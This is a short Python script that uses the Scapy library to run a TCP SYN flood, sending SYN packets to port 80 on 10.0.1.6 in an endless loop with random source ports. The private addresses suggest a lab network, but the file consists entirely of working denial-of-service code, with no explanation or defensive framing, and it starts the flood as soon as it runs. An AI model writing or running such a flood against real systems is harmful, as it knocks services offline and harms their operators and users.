from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send
import random

target_ip = "10.0.1.6"
target_port = 80
src_ip = "10.0.1.3"

def syn_flood():
    while True:
        src_port = random.randint(1024, 65535)
        pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
        send(pkt, verbose=False)

syn_flood()